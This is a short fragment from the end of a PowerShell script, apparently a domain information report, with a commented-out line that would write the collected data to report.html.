    #output to a file
    #$DomainInfohtml | Out-File -FilePath "report.html"
    
}